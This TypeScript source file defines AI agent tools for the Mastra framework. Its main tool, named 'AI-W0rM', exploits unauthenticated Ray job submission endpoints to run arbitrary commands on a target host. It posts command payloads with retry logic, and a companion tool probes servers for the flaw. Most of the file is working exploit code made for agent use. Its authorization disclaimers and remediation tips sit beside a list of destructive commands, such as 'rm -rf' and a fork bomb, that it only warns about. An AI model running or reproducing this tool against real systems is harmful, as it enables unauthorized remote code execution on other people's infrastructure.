import { createTool } from '@mastra/core/tools';
import { z } from 'zod';
import axios, { AxiosError } from 'axios';

/**
 * AI-W0rM Tool - Ray RCE Exploit (Enhanced v1.1.0)
 * 
 * ⚠️ SECURITY WARNING ⚠️
 * This tool exploits Remote Code Execution vulnerabilities in Ray ML infrastructure.
 * 
 * LEGAL NOTICE:
 * - Use ONLY on systems you own or have explicit written authorization to test
 * - Unauthorized access to computer systems is illegal under CFAA and similar laws
 * - This tool is for authorized security testing and educational purposes ONLY
 * 
 * Based on research from Protect AI and Huntr Bug Bounty Platform
 * References:
 * - https://huntr.com/bounties/b507a6a0-c61a-4508-9101-fceb572b0385/
 * - https://huntr.com/bounties/787a07c0-5535-469f-8c53-3efa4e5717c7/
 * 
 * Version: 1.1.0 (Bug Fix Release - 06.11.2025)
 * Improvements:
 * - Enhanced error handling with detailed messages
 * - Retry logic with exponential backoff
 * - Rate limiting support
 * - Better input validation
 * - Structured logging
 */

interface RayJobResponse {
  job_id: string;
  submission_id: string;
  status?: string;
}

interface RetryConfig {
  maxRetries: number;
  initialDelay: number;
  maxDelay: number;
  backoffMultiplier: number;
}

/**
 * Sleep utility for retry delays
 */
const sleep = (ms: number): Promise<void> => new Promise(resolve => setTimeout(resolve, ms));

/**
 * Retry wrapper with exponential backoff
 */
async function retryWithBackoff<T>(
  fn: () => Promise<T>,
  config: RetryConfig,
  attemptNumber: number = 0
): Promise<T> {
  try {
    return await fn();
  } catch (error) {
    if (attemptNumber >= config.maxRetries) {
      throw error;
    }
    
    const delay = Math.min(
      config.initialDelay * Math.pow(config.backoffMultiplier, attemptNumber),
      config.maxDelay
    );
    
    console.log(`Retry attempt ${attemptNumber + 1}/${config.maxRetries} after ${delay}ms`);
    await sleep(delay);
    
    return retryWithBackoff(fn, config, attemptNumber + 1);
  }
}

/**
 * Validate target host format
 */
function validateTargetHost(host: string): { valid: boolean; error?: string } {
  if (!host || host.trim().length === 0) {
    return { valid: false, error: 'Target host cannot be empty' };
  }
  
  const dangerousPatterns = [';', '&&', '||', '|', '`', '$', '(', ')'];
  if (dangerousPatterns.some(pattern => host.includes(pattern))) {
    return { valid: false, error: 'Target host contains potentially dangerous characters' };
  }
  
  return { valid: true };
}

/**
 * Validate command for dangerous patterns
 */
function validateCommand(command: string): { valid: boolean; warning?: string } {
  const destructivePatterns = ['rm -rf', 'mkfs', 'dd if=', ':(){:|:&};:', 'fork bomb'];
  const hasDestructive = destructivePatterns.some(pattern => 
    command.toLowerCase().includes(pattern.toLowerCase())
  );
  
  if (hasDestructive) {
    return { 
      valid: true, 
      warning: '⚠️ WARNING: Command contains potentially destructive operations. Use with extreme caution.' 
    };
  }
  
  return { valid: true };
}

export const aiW0rmTool = createTool({
  id: 'ai-w0rm-exploit',
  description: `Execute commands on Ray ML infrastructure via RCE vulnerability. 
  Ray is an open-source framework for distributed ML training that by default lacks authentication.
  This tool exploits the job submission endpoint to execute arbitrary commands.
  
  ⚠️ WARNING: Use only on authorized systems for security testing purposes.
  
  Enhanced Features (v1.1.0):
  - Automatic retry with exponential backoff
  - Input validation and sanitization
  - Detailed error messages with remediation hints
  - Command safety warnings`,
  
  inputSchema: z.object({
    targetHost: z.string().describe('Target Ray server hostname or IP address'),
    targetPort: z.number().default(8265).describe('Target Ray server port (default: 8265)'),
    command: z.string().describe('Command to execute on the target system'),
    useSSL: z.boolean().default(false).describe('Use HTTPS instead of HTTP'),
    timeout: z.number().default(10000).describe('Request timeout in milliseconds'),
    maxRetries: z.number().default(3).describe('Maximum number of retry attempts (default: 3)'),
  }),
  
  outputSchema: z.object({
    success: z.boolean(),
    jobId: z.string().optional(),
    submissionId: z.string().optional(),
    endpoint: z.string(),
    message: z.string(),
    error: z.string().optional(),
    warning: z.string().optional(),
    retryAttempts: z.number().optional(),
  }),
  
  execute: async ({ context }) => {
    const { targetHost, targetPort, command, useSSL, timeout, maxRetries } = context;
    
    // Validate inputs
    const hostValidation = validateTargetHost(targetHost);
    if (!hostValidation.valid) {
      return {
        success: false,
        endpoint: '',
        message: 'Input validation failed',
        error: hostValidation.error,
      };
    }
    
    const commandValidation = validateCommand(command);
    const warning = commandValidation.warning;
    
    const protocol = useSSL ? 'https' : 'http';
    const baseUrl = `${protocol}://${targetHost}:${targetPort}`;
    
    const payload = {
      entrypoint: command,
    };
    
    const endpoints = [
      `${baseUrl}/api/jobs/`,
      `${baseUrl}/api/job_agent/jobs/`,
    ];
    
    const retryConfig: RetryConfig = {
      maxRetries,
      initialDelay: 1000,
      maxDelay: 10000,
      backoffMultiplier: 2,
    };
    
    let lastError: Error | null = null;
    let attemptsMade = 0;
    
    for (const endpoint of endpoints) {
      try {
        const result = await retryWithBackoff(
          async () => {
            attemptsMade++;
            const response = await axios.post<RayJobResponse>(
              endpoint,
              payload,
              {
                timeout,
                headers: {
                  'Content-Type': 'application/json',
                  'User-Agent': 'AI-W0RM-Cyborg-G7/1.1.0',
                },
                validateStatus: (status) => status === 200 || status === 201,
              }
            );
            
            return response.data;
          },
          retryConfig
        );
        
        return {
          success: true,
          jobId: result.job_id,
          submissionId: result.submission_id,
          endpoint,
          message: `✓ Command executed successfully. Job ID: ${result.job_id}, Submission ID: ${result.submission_id}`,
          warning,
          retryAttempts: attemptsMade - 1,
        };
        
      } catch (error) {
        lastError = error as Error;
        
        if (endpoint === endpoints[endpoints.length - 1]) {
          let errorMessage = 'Failed to execute command on target';
          let errorDetails = '';
          
          if (axios.isAxiosError(error)) {
            const axiosError = error as AxiosError;
            
            if (axiosError.code === 'ECONNREFUSED') {
              errorMessage = 'Connection refused - Ray server may not be running';
              errorDetails = `Ensure Ray is running on ${targetHost}:${targetPort} and the port is accessible`;
            } else if (axiosError.code === 'ETIMEDOUT') {
              errorMessage = 'Connection timeout - Target may be unreachable';
              errorDetails = 'Check network connectivity and firewall rules';
            } else if (axiosError.response?.status === 404) {
              errorMessage = 'API endpoint not found';
              errorDetails = 'Ray version may not support this endpoint or Ray is not properly configured';
            } else if (axiosError.response?.status === 401 || axiosError.response?.status === 403) {
              errorMessage = 'Authentication required';
              errorDetails = 'Target has authentication enabled - this is good security! Exploitation not possible.';
            } else {
              errorDetails = axiosError.message;
            }
          } else {
            errorDetails = error instanceof Error ? error.message : 'Unknown error';
          }
          
          return {
            success: false,
            endpoint,
            message: errorMessage,
            error: errorDetails,
            retryAttempts: attemptsMade - 1,
          };
        }
        continue;
      }
    }
    
    return {
      success: false,
      endpoint: baseUrl,
      message: 'All endpoints failed',
      error: lastError?.message || 'No valid endpoint found',
      retryAttempts: attemptsMade,
    };
  },
});

/**
 * Utility function to check if a Ray server is vulnerable (Enhanced v1.1.0)
 */
export const checkRayVulnerability = createTool({
  id: 'check-ray-vulnerability',
  description: `Check if a Ray server is vulnerable to RCE by testing connectivity and API availability.
  
  Enhanced Features (v1.1.0):
  - Better error categorization
  - Detailed remediation recommendations
  - Version detection hints`,
  
  inputSchema: z.object({
    targetHost: z.string().describe('Target Ray server hostname or IP address'),
    targetPort: z.number().default(8265).describe('Target Ray server port (default: 8265)'),
    useSSL: z.boolean().default(false).describe('Use HTTPS instead of HTTP'),
    timeout: z.number().default(5000).describe('Request timeout in milliseconds'),
  }),
  
  outputSchema: z.object({
    vulnerable: z.boolean(),
    accessible: z.boolean(),
    endpoints: z.array(z.object({
      url: z.string(),
      available: z.boolean(),
      statusCode: z.number().optional(),
    })),
    message: z.string(),
    remediation: z.string().optional(),
  }),
  
  execute: async ({ context }) => {
    const { targetHost, targetPort, useSSL, timeout } = context;
    
    const hostValidation = validateTargetHost(targetHost);
    if (!hostValidation.valid) {
      return {
        vulnerable: false,
        accessible: false,
        endpoints: [],
        message: 'Input validation failed',
        remediation: hostValidation.error,
      };
    }
    
    const protocol = useSSL ? 'https' : 'http';
    const baseUrl = `${protocol}://${targetHost}:${targetPort}`;
    
    const endpoints = [
      `${baseUrl}/api/jobs/`,
      `${baseUrl}/api/job_agent/jobs/`,
    ];
    
    const results = [];
    let accessible = false;
    let vulnerable = false;
    
    for (const endpoint of endpoints) {
      try {
        const response = await axios.get(endpoint, {
          timeout,
          headers: {
            'User-Agent': 'AI-W0RM-Cyborg-G7/1.1.0',
          },
          validateStatus: () => true,
        });
        
        accessible = true;
        const available = response.status !== 404;
        
        if (available) {
          vulnerable = true;
        }
        
        results.push({
          url: endpoint,
          available,
          statusCode: response.status,
        });
        
      } catch (error) {
        results.push({
          url: endpoint,
          available: false,
        });
      }
    }
    
    let message = '';
    let remediation = '';
    
    if (!accessible) {
      message = '✓ Target is not accessible or Ray server is not running';
      remediation = 'If this is unexpected, check: 1) Ray is running, 2) Port is correct, 3) Firewall allows access';
    } else if (vulnerable) {
      message = '⚠️ CRITICAL: Target is VULNERABLE - Ray job submission endpoints are accessible without authentication';
      remediation = 'IMMEDIATE ACTIONS REQUIRED:\n' +
        '1. Enable Ray authentication\n' +
        '2. Restrict network access to Ray ports (8265, 10001, 6379)\n' +
        '3. Use firewall rules or VPN\n' +
        '4. Update Ray to latest version\n' +
        '5. Monitor job submission logs for suspicious activity';
    } else {
      message = '✓ Target is accessible but job submission endpoints are not available (Good!)';
      remediation = 'Continue monitoring and keep Ray updated';
    }
    
    return {
      vulnerable,
      accessible,
      endpoints: results,
      message,
      remediation,
    };
  },
});
